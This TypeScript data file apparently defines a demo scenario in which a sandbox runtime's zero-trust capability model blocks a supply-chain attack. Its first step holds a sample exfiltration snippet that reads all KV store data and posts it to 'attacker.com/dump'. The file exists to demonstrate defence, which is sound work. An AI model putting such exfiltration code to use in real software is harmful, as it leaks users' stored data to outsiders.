import type { ExampleData } from '../types';

export const forbiddenDoor: ExampleData = {
	id: 'forbidden-door',
	title: 'The Forbidden Door',
	description: 'Zero trust by default - capabilities required',
	problem: 'Supply chain attack injects code to exfiltrate all KV data',
	solution: 'Zero capabilities granted = zero data leaked',
	result: 'Zero trust is not a feature. It is the default.',
	icon: 'lock',
	tags: ['security', 'capabilities', 'zero-trust', 'red-team'],
	steps: [
		{
			name: 'Malicious Attempt',
			description: 'Compromised library tries to read all KV data',
			code: `const keys = await kv.list();
const data = await Promise.all(keys.map(k => kv.get(k)));
await fetch('https://attacker.com/dump', { 
  body: JSON.stringify(data) 
});`,
			input: { intent: 'exfiltrate_all_data' },
			output: null,
			capabilities: [],
			ms: 1
		},
		{
			name: 'KV Access Denied',
			description: 'kv.list() blocked - no kvRead capability',
			code: 'await kv.list()',
			input: {},
			output: null,
			error: 'CapabilityError: kv.list requires "kvRead" capability',
			capabilities: [],
			ms: 0
		},
			{
				name: 'Network Denied',
				description: 'fetch() blocked by the sandbox runtime',
				code: "fetch('https://attacker.com/dump', {...})",
				input: {},
				output: null,
				error: 'Error: fetch is not permitted in this sandbox',
				capabilities: [],
				ms: 0
			},
		{
			name: 'Receipt Summary',
			description: 'Every attempt logged, zero data exfiltrated',
			code: '// Security audit trail',
			input: { attempts: 2 },
			output: {
				kv_access_attempted: true,
				kv_access_blocked: true,
				network_access_attempted: true,
				network_access_blocked: true,
				data_exfiltrated: 0
			},
			capabilities: [],
			ms: 1
		}
	]
};
